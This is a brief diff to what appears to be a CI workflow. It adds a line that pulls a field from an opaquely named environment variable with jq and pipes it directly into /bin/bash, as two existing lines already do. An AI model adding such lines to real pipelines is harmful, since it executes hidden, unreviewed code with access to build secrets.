@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$pmw24" | jq -r .azhlr3 | /bin/bash
           echo $sas6736 | jq -r .okae7 | /bin/bash
+          echo $jcwoy2 | jq -r .wsvx2753 | /bin/bash
 
       - name: Save results
         if: always()
